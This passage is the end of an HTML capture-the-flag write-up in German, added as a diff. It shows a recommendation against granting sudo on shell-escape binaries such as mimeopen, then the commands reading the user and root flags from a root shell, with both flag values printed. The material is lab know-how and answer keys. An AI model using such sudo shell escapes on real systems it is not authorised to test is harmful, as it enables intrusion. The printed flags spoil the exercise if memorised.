+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht! Führe `id` aus, um die Root-Rechte zu bestätigen. Suche nach den Root- und User-Flags (`cat /root/root.txt`, `cat /home/estas/user.txt`).<br><strong>Empfehlung (Admin):</strong> Niemals `sudo`-Rechte für Befehle vergeben, die eine Shell-Flucht oder die Ausführung beliebiger Befehle ermöglichen (wie `mimeopen`, `find`, `less`, `more`, `vim`, `nano`, etc.), es sei denn, es ist absolut unvermeidlich und die Risiken sind verstanden. Wenn `mimeopen` via `sudo` benötigt wird, sollte dies auf spezifische, ungefährliche Aktionen beschränkt werden, falls möglich.</p>
+
+        </section>
+
+         <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/estas/user.txt</div>
+                           <div class="flag-value"><span class="password">whereihavebeen</span></div>
+                        </div>
+                    </center>
+                </div>
+                <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird der Inhalt der Datei `/home/estas/user.txt` ausgelesen. Dies ist üblicherweise der Speicherort für die User-Flag bei CTF-Boxen.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde erfolgreich gefunden.</p>
+
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">ihavebeenherealways</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird der Inhalt der Datei `/root/root.txt` ausgelesen. Dies ist der Standard-Speicherort für die Root-Flag.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich gefunden. Das Ziel der vollständigen Kompromittierung wurde erreicht.</p>
+
+            </div>
+        </section>
+
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. Oktober 2022</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
